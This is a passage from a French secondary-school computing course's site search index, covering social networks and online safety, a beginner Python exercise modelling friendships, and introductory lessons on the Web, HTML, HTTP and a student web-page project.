\u00eatre associ\u00e9s au fonctionnement d'un r\u00e9seau social</p> <p>Ces entreprises doivent donc r\u00e9mun\u00e9rer ou financer toutes les fonctionnalit\u00e9s de leurs r\u00e9seaux sociaux et cela avec diverses m\u00e9thodes.</p> <p>Lister des m\u00e9thodes de financement des r\u00e9seaux sociaux</p>"},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#contenus-disponibles-sur-un-reseau-social","title":"\ud83d\udcd6 Contenus disponibles sur un r\u00e9seau social","text":"<p>Sur un r\u00e9seau social, il existe bons nombre de contenus diff\u00e9rents qui sont publi\u00e9s pour des utilisateurs par des utilisateurs.</p> <p>Lister quels contenus peuvent \u00eatre pr\u00e9sents sur un r\u00e9seau social</p> <p>Les contenus sont soumis \u00e0 un r\u00e9glement sp\u00e9cifique au r\u00e9seau social et m\u00eame \u00e0 la loi. En effet,chaque utilisateur est p\u00e9nalement responsable de ce qu'il poste sur un r\u00e9seau social. Les contenus publi\u00e9s sur un r\u00e9seau social sont consid\u00e9r\u00e9s publics et \u00e0 vis\u00e9e de tous. Par exemple : il est strictement interdit de publier des contenus \u00e0 caract\u00e8res discriminatoires, diffamant et \u00e0 vis\u00e9e de harc\u00e8lement envers autrui.</p> <p>Ces contenus peuvent \u00eatre produits par des cr\u00e9ateurs qui souhaitent partager leurs passions, des entreprises ou des magasins qui veulent \u00e9tendre leur client\u00e8le ou par des influenceurs pay\u00e9s par des marques pour r\u00e9aliser des publicit\u00e9s.</p>"},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#reputation-de-lutilisateur-en-ligne","title":"R\u00e9putation de l'utilisateur en ligne","text":"<p>Ces contenus (prises de parole, opinions, photos, vid\u00e9o, placements de produits) peuvent notamment affecter la r\u00e9putation de l'utilisateur en ligne : on l'appelle e-reputation. Elle renvoie directement \u00e0 tous les utilisateurs l'image de celui qui publie du contenu en ligne.</p> <p>Une bonne e-reputation permet de cr\u00e9er un sentiment de confiance \u00e0 l'\u00e9gard de l'utilisateur qui poste des contenus en ligne.</p>"},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#utilisation-responsable-des-reseaux-sociaux","title":"\ud83d\udd10 Utilisation responsable des r\u00e9seaux sociaux","text":""},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#cadre-legal-et-majorite-numerique","title":"\u2696\ufe0f Cadre l\u00e9gal et majorit\u00e9 num\u00e9rique","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>La majorit\u00e9 num\u00e9rique est l'\u00e2ge \u00e0 partir duquel un mineur peut consentir seul au traitement de ses donn\u00e9es personnelles sur les plateformes num\u00e9riques.</p> \u00c2ge Droits et obligations Supervision requise &lt; 15 ans Autorisation parentale obligatoire Contr\u00f4le parental recommand\u00e9 15-18 ans Inscription autonome possible Accompagnement conseill\u00e9 &gt; 18 ans Autonomie compl\u00e8te Responsabilit\u00e9 personnelle <p>Warning</p> <p>Cette r\u00e8gle prot\u00e8ge les mineurs mais n'emp\u00eache pas les risques. La sensibilisation reste essentielle \u00e0 tout \u00e2ge.</p>"},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#creation-et-gestion-de-profil","title":"\ud83d\udc64 Cr\u00e9ation et gestion de profil","text":""},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#etapes-de-creation","title":"\ud83d\udee0\ufe0f \u00c9tapes de cr\u00e9ation","text":"\u00c9tape Action Conseils de s\u00e9curit\u00e9 1. Inscription Email/t\u00e9l\u00e9phone + mot de passe Utiliser une adresse email d\u00e9di\u00e9e 2. Identit\u00e9 Nom d'utilisateur + photo \u00c9viter les informations trop personnelles 3. Profil Bio, centres d'int\u00e9r\u00eat Limiter les d\u00e9tails priv\u00e9s 4. Confidentialit\u00e9 Param\u00e8tres de visibilit\u00e9 Profil priv\u00e9 par d\u00e9faut 5. Contacts Ajout d'amis/abonn\u00e9s V\u00e9rifier l'identit\u00e9 des demandes"},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#cyberviolence-et-protection-numerique","title":"\u26a0\ufe0f Cyberviolence et protection num\u00e9rique","text":""},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#typologie-des-violences-en-ligne","title":"\ud83c\udfaf Typologie des violences en ligne","text":"Type Description Exemples Cons\u00e9quences Cyberharc\u00e8lement Attaques r\u00e9p\u00e9t\u00e9es et coordonn\u00e9es Messages d'insultes, moqueries publiques Anxi\u00e9t\u00e9, d\u00e9pression, isolement Doxxing Publication d'informations priv\u00e9es Adresse, t\u00e9l\u00e9phone, photos intimes Atteinte \u00e0 la vie priv\u00e9e, chantage Revenge porn Diffusion non consentie d'images Photos/vid\u00e9os intimes partag\u00e9es Humiliation, d\u00e9tresse psychologique Cyberstalking Surveillance et traque num\u00e9rique G\u00e9olocalisation, espionnage Sentiment d'ins\u00e9curit\u00e9 permanent Hate speech Discours de haine cibl\u00e9 Propos racistes, homophobes Discrimination"},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#ressources-daide","title":"\ud83d\udcde Ressources d'aide","text":"Service Contact Sp\u00e9cialit\u00e9 3018 Num\u00e9ro gratuit Violences num\u00e9riques (mineurs) 3919 Num\u00e9ro national Violences faites aux femmes Net \u00c9coute 0800 200 000 Accompagnement jeunes Pharos pharos.gouv.fr Signalement contenus illicites"},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#modelisation-mathematique-les-graphes","title":"\ud83d\udcca Mod\u00e9lisation math\u00e9matique : les graphes","text":""},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#representation-des-reseaux-sociaux","title":"\ud83d\udd17 Repr\u00e9sentation des r\u00e9seaux sociaux","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>Un graphe est une structure math\u00e9matique qui mod\u00e9lise les relations entre entit\u00e9s. Dans le contexte des r\u00e9seaux sociaux, il repr\u00e9sente les connexions entre utilisateurs.</p>"},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#composants-dun-graphe-social","title":"\ud83c\udfd7\ufe0f Composants d'un graphe social","text":"\u00c9l\u00e9ment Repr\u00e9sentation Exemple concret Sommets (n\u0153uds) Utilisateurs du r\u00e9seau Profils Facebook, comptes Twitter Ar\u00eates (liens) Relations entre utilisateurs Amiti\u00e9, abonnement, mention Poids Force de la relation Fr\u00e9quence d'interaction, proximit\u00e9 Direction Sens de la relation Abonnement unilat\u00e9ral vs amiti\u00e9 mutuelle <p>Indiquer sur le dessin ci-dessous, quel graphe est orient\u00e9 et lequel est non orient\u00e9. </p> <p>Vous avez un groupe de 6 amis : Alice, Bob, Charlie, David, Emma et Frank. Vous devez mod\u00e9liser leurs amiti\u00e9s en utilisant un graphe. Un graphe est constitu\u00e9 de sommets (les personnes) et d'ar\u00eates (les relations d'amiti\u00e9). Voici les informations sur leurs amiti\u00e9s :</p> <ul> <li>Alice est amie avec Bob, Charlie et Emma.</li> <li>Bob est ami avec Alice, David et Frank.</li> <li>Charlie est ami avec Alice et Emma.</li> <li>David est ami avec Bob et Frank.</li> <li>Emma est amie avec Alice et Charlie.</li> <li>Frank est ami avec Bob et David.</li> </ul> <p>Activit\u00e9</p> <ul> <li> <p>\u00c0 l'aide du graphe de l'exercice pr\u00e9c\u00e9dent, donner le centre du graphe (c'est \u00e0 dire la personne qui a le plus d'amis).</p> </li> <li> <p>Donner un rayon de ce graphe, donner sa longueur.</p> </li> <li> <p>En d\u00e9duire un diam\u00e8tre de ce graphe, donner sa longueur.</p> </li> </ul>"},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#lexperience-de-milgram-et-les-6-degres-de-separation","title":"\ud83c\udf0d L'exp\u00e9rience de Milgram et les \"6 degr\u00e9s de s\u00e9paration\"","text":""},{"location":"seconde/III_-_Reseaux_sociaux/Cours/#contexte-historique","title":"\ud83d\udcda Contexte historique","text":"<p>En 1967, le psychologue Stanley Milgram teste une hypoth\u00e8se r\u00e9volutionnaire : dans un monde de plus en plus connect\u00e9, quelle est la distance sociale r\u00e9elle entre deux personnes quelconques ?</p> <p> </p> <p>Testez la th\u00e9orie des 6 degr\u00e9s \u00e0 l'\u00e8re digitale :</p>"},{"location":"seconde/III_-_Reseaux_sociaux/TP_reseau_social/","title":"TP : Mod\u00e9liser un r\u00e9seau social en Python","text":"<p>Dans ce TP, tu vas utiliser des \"moules\" Python (appel\u00e9s \"classes\") pour cr\u00e9er des objets et simuler un r\u00e9seau social. Imagine que tu as deux types de moules : un moule <code>Utilisateur</code> pour fabriquer des personnes, et un moule <code>ReseauSocial</code> pour construire le r\u00e9seau qui les relie. Ton travail sera d'utiliser ces moules pour cr\u00e9er des personnes et les connecter entre elles pour former un r\u00e9seau d'amis.</p> <pre><code># Voici les deux \"moules\" (classes) que tu vas utiliser :\n# Tu n'as pas besoin de comprendre comment ils sont fabriqu\u00e9s, juste comment les utiliser pour cr\u00e9er tes objets !\n\nclass Utilisateur:\n    # Quand tu utilises le moule `Utilisateur` pour cr\u00e9er une personne, tu lui donnes un nom.\n    # Au d\u00e9but, cette personne n'a pas encore d'amis.\n    def __init__(self, nom: str):\n        self.nom: str = nom\n        self.amis: list['Utilisateur'] = []\n\n    # Cette fonction permet d'ajouter un ami \u00e0 un utilisateur.\n    def ajouter_ami(self, autre_utilisateur: 'Utilisateur'):\n        if autre_utilisateur not in self.amis:\n            self.amis.append(autre_utilisateur)\n\n    # Permet d'afficher l'utilisateur de mani\u00e8re simple (ex: Utilisateur(Alice))\n    def __repr__(self) -&gt; str:\n        return f\"Utilisateur({self.nom})\"\n\nclass ReseauSocial:\n    # Ce moule `ReseauSocial` va te permettre de g\u00e9rer l'ensemble de ton r\u00e9seau.\n    # Il contient la liste de toutes les personnes (Utilisateur) que tu as cr\u00e9\u00e9es.\n    # Quand tu utilises ce moule, il cr\u00e9e un r\u00e9seau social tout neuf, sans aucun utilisateur au d\u00e9part.\n    def __init__(self):\n        self.utilisateurs: list['Utilisateur'] = []\n\n    # Cette fonction te permet d'ajouter une personne que tu as cr\u00e9\u00e9e (un objet `Utilisateur`)\n    # \u00e0 ton r\u00e9seau social.\n    def ajouter_utilisateur(self, utilisateur: 'Utilisateur'):\n        if utilisateur not in self.utilisateurs:\n            self.utilisateurs.append(utilisateur)\n\n    # Cette fonction permet de cr\u00e9er un lien d'amiti\u00e9 entre deux personnes d\u00e9j\u00e0 pr\u00e9sentes dans ton r\u00e9seau.\n    def lier_amis(self, utilisateur1: 'Utilisateur', utilisateur2: 'Utilisateur'):\n        utilisateur1.ajouter_ami(utilisateur2)\n        utilisateur2.ajouter_ami(utilisateur1)\n\n    # Cette fonction te permet de voir qui est ami avec qui dans ton r\u00e9seau social.\n    def afficher_reseau(self):\n        for utilisateur in self.utilisateurs:\n            print(f\"{utilisateur.nom} a pour amis : {[ami.nom for ami in utilisateur.amis]}\")\n</code></pre>"},{"location":"seconde/III_-_Reseaux_sociaux/TP_reseau_social/#consignes-a-toi-de-jouer","title":"Consignes : \u00c0 toi de jouer !","text":"<p>Suis les \u00e9tapes ci-dessous dans la partie \"Exemple de code \u00e0 compl\u00e9ter\" :</p> <ol> <li>Cr\u00e9e un r\u00e9seau social : Utilise <code>reseau = ReseauSocial()</code> pour commencer.</li> <li>Cr\u00e9e trois personnes (utilisateurs) : Donne-leur des noms comme \"Alice\", \"Bob\" et \"Charlie\" en utilisant <code>Utilisateur(\"Nom\")</code>.</li> <li>Ajoute ces personnes \u00e0 ton r\u00e9seau social : Utilise la fonction <code>reseau.ajouter_utilisateur(*utilisateur*)</code> pour chaque personne.</li> <li>Cr\u00e9e des liens d'amiti\u00e9 : Utilise la fonction <code>reseau.lier_amis()</code> pour connecter Alice et Bob, puis Bob et Charlie.</li> <li>Affiche le r\u00e9seau : Utilise <code>reseau.afficher_reseau()</code> pour voir qui est ami avec qui.</li> </ol> <p>Exemple de code \u00e0 compl\u00e9ter :</p> <pre><code># \u00c9tape 1 : Cr\u00e9e ton r\u00e9seau social\nreseau = ______\n\n# \u00c9tape 2 : Cr\u00e9e trois personnes (utilisateurs) avec leurs noms\nalice = Utilisateur(\"_____\")\nbob = Utilisateur(\"_____\")\ncharlie = Utilisateur(\"_____\")\n\n# \u00c9tape 3 : Ajoute ces personnes \u00e0 ton r\u00e9seau social\nreseau.ajouter_utilisateur(_____)\nreseau.ajouter_utilisateur(_____)\nreseau.ajouter_utilisateur(_____)\n\n# \u00c9tape 4 : Cr\u00e9e des liens d'amiti\u00e9 entre eux\n# Par exemple, Alice devient amie avec Bob\nreseau.lier_amis(_____, _____)\n# Et Bob devient ami avec Charlie\nreseau.lier_amis(_____, _____)\n\n# \u00c9tape 5 : Affiche le r\u00e9seau pour voir les amiti\u00e9s\nreseau.afficher_reseau()\n</code></pre> <p>N'h\u00e9site pas \u00e0 modifier les noms ou \u00e0 ajouter d'autres utilisateurs pour tester !</p>"},{"location":"seconde/II_-_Web/Cours/","title":"Cours","text":"\ud83c\udf10 Web <p>L'\u00e9volution du World Wide Web et ses technologies fondamentales</p> \ud83d\udcc5 L'Histoire du World Wide Web 1989 Naissance du Web                  Tim Berners-Lee et Robert Cailliau cr\u00e9ent le World Wide Web au CERN en Suisse. L'objectif : permettre l'\u00e9change de donn\u00e9es sur Internet via des hyperliens.              1991 Premier Site Web                  Mise en ligne de la toute premi\u00e8re page web au CERN, expliquant le concept du World Wide Web et comment l'utiliser.              1993 Web Libre                  Le CERN annonce que le Web sera libre d'utilisation pour tous, sans redevances. Cette d\u00e9cision r\u00e9volutionnaire permet l'explosion du Web.              Aujourd'hui Web Moderne                  Plus de 1,7 milliard de sites web actifs, avec des technologies avanc\u00e9es permettant des applications complexes et interactives.              \ud83c\udfaf Concept Fondamental : Les Hyperliens              La technologie du Web repose sur les hyperliens - des liens cliquables qui permettent de naviguer entre les ressources stock\u00e9es sur diff\u00e9rents serveurs \u00e0 travers le monde.                   \ud83d\udd17 Exemple d'hyperlien : Lien menant \u00e0 l'accueil du site          \ud83c\udf0d Anecdote historique : D\u00e9couvrez la toute premi\u00e8re page web cr\u00e9\u00e9e par les chercheurs du CERN !      \ud83d\udd04 Le Mod\u00e8le Client-Serveur \ud83c\udfaf Architecture Fondamentale              Le Web fonctionne selon un mod\u00e8le client-serveur o\u00f9 les machines communiquent selon des r\u00f4les bien d\u00e9finis.          \ud83d\udcbb Client                  Machine qui souhaite recevoir des informations ou des donn\u00e9es. Correspond \u00e0 la machine r\u00e9ceptrice dans les \u00e9changes TCP. Exemple : votre navigateur web.              \ud83d\udda5\ufe0f Serveur                  Machine qui dispose d'informations et a pour r\u00f4le de les envoyer. Correspond \u00e0 la machine \u00e9mettrice. Exemple : serveur h\u00e9bergeant un site web.              \ud83d\udce1 Communication par Requ\u00eates              Les \u00e9changes entre client et serveur se font via des requ\u00eates - des messages formalis\u00e9s qui permettent de demander ou d'envoyer des donn\u00e9es.          \ud83c\udff7\ufe0f Adresses IP et URL \ud83c\udf10 De l'IP \u00e0 l'URL              Plut\u00f4t que de retenir des adresses IP comme 216.58.214.163 pour acc\u00e9der \u00e0 Google, nous utilisons des URL (Uniform Resource Locator) - des adresses intelligibles par l'humain.          \ud83e\udde9 Structure d'une URL \ud83d\udcdd Exemple d'URL d\u00e9compos\u00e9e <pre><code>https://www.google.com/search?q=exemple\n\u2502      \u2502   \u2502      \u2502   \u2502\n\u2502      \u2502   \u2502      \u2502   \u2514\u2500 Param\u00e8tres de requ\u00eate\n\u2502      \u2502   \u2502      \u2514\u2500\u2500\u2500\u2500\u2500 Chemin vers la ressource\n\u2502      \u2502   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Nom de domaine\n\u2502      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Sous-domaine\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Protocole utilis\u00e9</code></pre> \ud83d\udd12 Protocole http:// ou https:// \ud83c\udf0d Sous-domaine www (optionnel) \ud83c\udfe0 Nom de domaine google, facebook, etc. \ud83c\udff7\ufe0f Extension .com, .fr, .org, etc. \ud83d\uddc2\ufe0f Serveur DNS (Domain Name Server)              Le serveur DNS maintient une table de correspondance entre les adresses IP et les adresses symboliques, permettant la traduction automatique des URL en adresses IP.          \ud83d\udcca Exemple de Table DNS Site Adresse symbolique Adresse IP Google www.google.fr 172.217.20.163 YouTube www.youtube.fr 142.250.178.142 Leboncoin www.leboncoin.fr 18.164.52.43 Amazon www.amazon.fr 52.95.116.113 \ud83d\udd0d Fonctionnement du Serveur DNS \ud83c\udfaf R\u00e9solution DNS              Le serveur DNS associe une adresse symbolique avec une adresse IP. Le processus varie selon que l'adresse est d\u00e9j\u00e0 connue ou non.          \ud83d\udcbe Adresse Connue (Cache)                  Si l'adresse symbolique est stock\u00e9e dans le cache du navigateur, celui-ci utilise directement l'adresse IP correspondante sans interroger de serveur DNS externe.              \ud83d\udd04 Adresse Inconnue (R\u00e9cursif)                  Si l'adresse n'est pas connue, une s\u00e9rie de requ\u00eates r\u00e9cursives est lanc\u00e9e pour trouver le serveur DNS qui dispose de l'information recherch\u00e9e.                       \ud83d\udca1 Exemple pratique : Recherche de www.google.fr \u2192 Le navigateur utilise directement l'IP 172.217.20.163 si elle est en cache.      \ud83d\udcdd Le Langage HTML \ud83c\udfaf HTML (HyperText Markup Language)              Cr\u00e9\u00e9 en 1991 par Tim Berners-Lee au CERN, HTML est un langage \u00e0 balises qui structure et organise le contenu des pages web.          \ud83c\udff7\ufe0f Principe des Balises              Les balises sont des \u00e9l\u00e9ments entour\u00e9s de crochets angulaires (<code>&lt; &gt;</code>) qui indiquent comment le contenu doit \u00eatre interpr\u00e9t\u00e9 ou affich\u00e9. Chaque \u00e9l\u00e9ment a une balise d'ouverture et de fermeture.          \ud83d\udcbb Exemple de Balise HTML <pre><code>&lt;p&gt;Ceci est un paragraphe.&lt;/p&gt;\n\n&lt;h1&gt;Titre principal&lt;/h1&gt;\n&lt;h2&gt;Sous-titre&lt;/h2&gt;\n\n&lt;a href=\"https://example.com\"&gt;Lien hypertexte&lt;/a&gt;\n\n&lt;img src=\"image.jpg\" alt=\"Description de l'image\" /&gt;</code></pre>          \u2728 Caract\u00e9ristiques cl\u00e9s : Les balises ne sont pas visibles par l'utilisateur final - elles servent uniquement \u00e0 structurer le document et contr\u00f4ler son rendu.               \ud83c\udfaf Usage : HTML permet d'ajouter une signification s\u00e9mantique aux donn\u00e9es et de contr\u00f4ler la mise en forme du contenu web.      \ud83d\udce1 Protocole HTTP \ud83c\udfaf HTTP (HyperText Transfer Protocol)              HTTP est le protocole de communication qui permet l'\u00e9change de donn\u00e9es sur le Web selon un mod\u00e8le client-serveur. Le client envoie des requ\u00eates, le serveur r\u00e9pond avec des codes de statut et les ressources demand\u00e9es.          \ud83d\udd27 Les M\u00e9thodes HTTP \ud83d\udce5 M\u00e9thode GET                  Utilis\u00e9e pour r\u00e9cup\u00e9rer des informations. Ne modifie aucune donn\u00e9e sur le serveur. Permet d'obtenir des pages web, images, fichiers CSS/JS, etc.              \ud83d\udcbb Exemple de requ\u00eate GET <pre><code>GET /utilisateurs/profil?id=123 HTTP/1.1\nHost: www.reseausocial.com\nUser-Agent: Mozilla/5.0\nAccept-Language: fr-FR</code></pre> \ud83d\udce4 M\u00e9thode POST                  Utilis\u00e9e pour envoyer des donn\u00e9es au serveur afin de modifier des ressources. Utilis\u00e9e pour les formulaires, upload de fichiers, mise \u00e0 jour de profils, etc.              \ud83d\udcbb Exemple de requ\u00eate POST <pre><code>POST /utilisateurs/inscription HTTP/1.1\nHost: www.reseausocial.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 54\n\nnom=Dupont&amp;prenom=Jean&amp;email=jean.dupont@email.com</code></pre> \ud83d\udcca Codes de Statut HTTP 200 OK La requ\u00eate a r\u00e9ussi 404 Not Found La ressource demand\u00e9e n'existe pas 500 Internal Server Error Probl\u00e8me c\u00f4t\u00e9 serveur          \ud83d\udd04 Usage courant : Ces m\u00e9thodes sont utilis\u00e9es lors de l'envoi de formulaires ou de l'initialisation de pages par le navigateur.      \ud83c\udfc6 L'Algorithme PageRank \ud83c\udfaf R\u00e9volution de la Recherche Web              D\u00e9velopp\u00e9 par Larry Page et Sergey Brin \u00e0 Stanford en 1996, PageRank r\u00e9volutionne la recherche en classant les pages selon leur importance dans le r\u00e9seau Internet, pas seulement leur contenu.          \ud83d\uddf3\ufe0f Principe du \"Vote\"              PageRank fonctionne sur la logique de votes : une page \"vote\" pour une autre lorsqu'elle poss\u00e8de un lien vers celle-ci. Plus une page re\u00e7oit de liens, plus elle semble pertinente.          \u2696\ufe0f Pond\u00e9ration des Votes <p>Pour \u00e9viter les biais, certaines pages ont des votes plus importants que d'autres. Une page de haute qualit\u00e9 qui fait un lien vers votre site apporte plus de \"poids\" que de nombreux liens de faible qualit\u00e9.</p> \ud83d\udca1 Analogie : Comme le maire au Loup-Garou de Thiercelieux, certaines pages ont un vote qui compte double !                   \ud83c\udfaf Impact : Cette logique de calcul de pertinence est aujourd'hui utilis\u00e9e par la plupart des moteurs de recherche pour classer les r\u00e9sultats.               \ud83d\ude80 H\u00e9ritage : PageRank a permis \u00e0 Google de devenir le moteur de recherche dominant en proposant des r\u00e9sultats plus pertinents que ses concurrents."},{"location":"seconde/II_-_Web/Cours_html/","title":"\ud83d\udcda Notice sur HTML et cr\u00e9ation d'un site web basique","text":""},{"location":"seconde/II_-_Web/Cours_html/#1-quest-ce-que-html","title":"1. Qu'est-ce que HTML ?","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>HTML (HyperText Markup Language) est le langage de balisage utilis\u00e9 pour structurer le contenu des pages web. Chaque page web est un fichier HTML qui contient des balises permettant de d\u00e9finir diff\u00e9rents \u00e9l\u00e9ments comme des titres, des paragraphes, des images, des liens, etc.</p>"},{"location":"seconde/II_-_Web/Cours_html/#2-structure-dun-fichier-html","title":"2. Structure d'un fichier HTML","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>Un fichier HTML est structur\u00e9 de mani\u00e8re simple. Voici la structure de base d'un document HTML :</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"fr\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;Titre de la page&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;!-- Contenu visible de la page --&gt;\n    &lt;h1&gt;Bienvenue sur mon site&lt;/h1&gt;\n    &lt;p&gt;Ceci est un paragraphe.&lt;/p&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Explication :</p> <ul> <li><code>&lt;!DOCTYPE html&gt;</code> : Indique que le document utilise HTML5.</li> <li><code>&lt;html&gt;</code> : La balise qui contient tout le contenu HTML.</li> <li><code>&lt;head&gt;</code> : Section contenant des informations sur la page (m\u00e9tadonn\u00e9es), comme le titre.</li> <li><code>&lt;meta charset=\"UTF-8\"&gt;</code> : Sp\u00e9cifie l'encodage de caract\u00e8res (UTF-8).</li> <li><code>&lt;title&gt;</code> : D\u00e9finit le titre qui appara\u00eet dans l'onglet du navigateur.</li> <li><code>&lt;body&gt;</code> : Contient le contenu visible par l'utilisateur (titres, paragraphes, images, etc.).</li> </ul>"},{"location":"seconde/II_-_Web/Cours_html/#les-principales-balises-html","title":"Les principales balises HTML","text":"<p>\ud83d\udcd6 D\u00e9finition</p>"},{"location":"seconde/II_-_Web/Cours_html/#titres","title":"Titres","text":"<pre><code>&lt;h1&gt;Mon titre principal&lt;/h1&gt;\n&lt;h2&gt;Mon sous-titre&lt;/h2&gt;\n</code></pre> <p>Ces balises Titres vont de h1 \u00e0 h6, o\u00f9 h1 est le plus grand titre.</p>"},{"location":"seconde/II_-_Web/Cours_html/#paragraphes","title":"Paragraphes","text":"<p>Les paragraphes sont d\u00e9finis par la balise p.</p> <pre><code>&lt;p&gt;Ceci est un paragraphe.&lt;/p&gt;\n</code></pre>"},{"location":"seconde/II_-_Web/Cours_html/#liens","title":"Liens","text":"<p>Les liens sont cr\u00e9\u00e9s \u00e0 l'aide de la balise a.</p> <pre><code>&lt;a href=\"https://www.example.com\"&gt;Visiter Example.com&lt;/a&gt;\n</code></pre>"},{"location":"seconde/II_-_Web/Cours_html/#images","title":"Images","text":"<p>Les images sont ins\u00e9r\u00e9es par la balise img.</p> <pre><code>&lt;img src=\"source de l'image\" alt=\"Mon image\"&gt;\n</code></pre>"},{"location":"seconde/II_-_Web/Cours_html/#listes-non-ordonnees","title":"Listes Non ordonn\u00e9es","text":"<p>Les listes \u00e0 puces ordonn\u00e9es sont d\u00e9finies gr\u00e2ce \u00e0 ul.</p> <pre><code>&lt;ul&gt;\n    &lt;li&gt;Item 1&lt;/li&gt;\n    &lt;li&gt;Item 2&lt;/li&gt;\n&lt;/ul&gt;\n</code></pre>"},{"location":"seconde/II_-_Web/Cours_html/#listes-ordonnees","title":"Listes Ordonn\u00e9es","text":"<p>Les listes ordonn\u00e9es sont d\u00e9finies gr\u00e2ce \u00e0 ol.</p> <pre><code>&lt;ol&gt;\n    &lt;li&gt;Item 1&lt;/li&gt;\n    &lt;li&gt;Item 2&lt;/li&gt;\n&lt;/ol&gt;\n</code></pre>"},{"location":"seconde/II_-_Web/Cours_html/#but-de-la-seance","title":"But de la s\u00e9ance","text":"<p>\ud83d\udcd6 D\u00e9finition</p> <p>Vous devrez reproduire la page web suivante \u00e0 l'aide des balises que vous avez vu. Vous avez aussi le site w3school.</p> <p>L'image \u00e0 utiliser : image de maya</p>"},{"location":"seconde/II_-_Web/Projet_creation_site/","title":"\ud83d\udcda Projet : Cr\u00e9ation du Bestiaire","text":"<p>\ud83d\udcd6 Pr\u00e9paration</p>"},{"location":"seconde/II_-_Web/Projet_creation_site/#telechargement-des-ressources","title":"T\u00e9l\u00e9chargement des ressources","text":"<p>Pour la cr\u00e9ation du bestiaire, t\u00e9l\u00e9chargez l'archive correspondante en cliquant sur le lien hypertexte suivant : maquette_vide.</p> <p>Vous retrouverez :</p> <ul> <li>un fichier <code>index.html</code> qui correspond au site web \u00e0 remplir</li> <li>un dossier <code>image</code> qui contiendra l'image de votre monstre</li> <li>un dossier <code>style</code> qui contiendra tous les \u00e9l\u00e9ments de style de votre page</li> </ul> <p>\ud83c\udfcb\ufe0f Partie 1</p>"},{"location":"seconde/II_-_Web/Projet_creation_site/#remplir-le-site-comme-la-maquette","title":"Remplir le site comme la maquette","text":"<p>Voici ce que vous devez reproduire lors de la premi\u00e8re s\u00e9ance: </p> <p></p> <p>Chacun des blocs de couleur correspond \u00e0 une partie bien pr\u00e9cise du site. On les nomme <code>div</code> pour division d'une page web. Ils permettent de scinder la page en diverses parties.</p> <p>Le site est aussi r\u00e9gi par une feuille de style qui n'est pas \u00e0 modifier pour cette premi\u00e8re \u00e9tape.</p> <p></p> <p>\u00c0 cause d'un soucis d'affichage, le Nom du monstre correspond au bloc violet.</p> <p>Consignes pour cette premi\u00e8re partie :</p> <p>Modifier le Nom du monstre pour qu'il corresponde \u00e0 un titre de niveau 1.</p> <p>Dans le bloc bleu : Ajouter un paragraphe expliquant la rivalit\u00e9/l'amiti\u00e9 entre votre monstre/personnage et ses rivaux/amis.</p> <p>Dans le bloc turquoise : Ajouter chacune des localisations o\u00f9 l'on peut retrouver votre monstre (Conservez la liste si vous souhaitez une liste, sinon supprimez la et \u00e9crivez un paragraphe).</p> <p>Dans le bloc turquoise : Ajouter une liste \u00e0 puce correspondant \u00e0 ses statistiques si l'on souhaite transformer ce bestiaire en un jeu de r\u00f4le sinon une histoire par rapport \u00e0 son lieu d'habitat.</p> <p>Ajouter dans le bloc contenant la description et l'histoire de son monstre, un titre de niveau 3 permettant de structurer la page et en dessous un paragraphe expliquant l'histoire du monstre/personnage.</p> <p>Par la suite, on ajoutera les images des rivaux/personnages (quand votre monstre est disponible ici).</p> <p>Ajouter \u00e0 la place de <code>image du monstre</code> l'image du monstre associ\u00e9e.</p> <p>Pour se faire, vous rajouterez la balise suivante :  </p> <pre><code>    &lt;img class = \"image_principale\" align=\"left\" height=\"400px\" width=\"400px\" src=\"image/votre_prenom.png\" alt=\"nom_du_monstre\"/&gt;\n</code></pre> <p>Ajouter l'image du rival avec la balise suivante.</p> <pre><code>    &lt;img class = \"image_rival\" width=\"30%\"  src=\"image/rival2.png\" alt=\"Rival 2\"/&gt;\n</code></pre> <p>\ud83c\udfcb\ufe0f Partie 2</p>"},{"location":"seconde/II_-_Web/Projet_creation_site/#retirer-les-bordures","title":"Retirer les bordures","text":"<p>Le fichier <code>style.css</code> rassemble tous les \u00e9l\u00e9ments de style de la page.</p> <p>La syntaxe est telle que : </p> <pre><code>    .classe_de_l_element{\n        propriete_1 : valeurs;\n        propriete_2 : valeurs;\n        ...\n    }\n</code></pre> <p>Un des \u00e9l\u00e9ments de style pr\u00e9sent sur votre maquette est l'ensemble des bordures d\u00e9limitant les <code>div</code> pour que vous puissiez vous rep\u00e9rer.</p> <p>Consigne : Dans le fichier <code>style.css</code>, retirer l'ensemble des lignes qui ont un rapport avec les bordures.</p> <p>Vous chercherez sur internet comment r\u00e9aliser des bordures en CSS pour retrouver les mots-clefs correspondants.</p> <p></p> <p>\ud83c\udfcb\ufe0f Partie 3</p>"},{"location":"seconde/II_-_Web/Projet_creation_site/#fond-decran-et-couleurs-de-police-decriture","title":"Fond d'\u00e9cran et couleurs de police d'\u00e9criture","text":"<p>La derni\u00e8re \u00e9tape de ce projet correspond \u00e0 l'ajout du fond d'\u00e9cran et 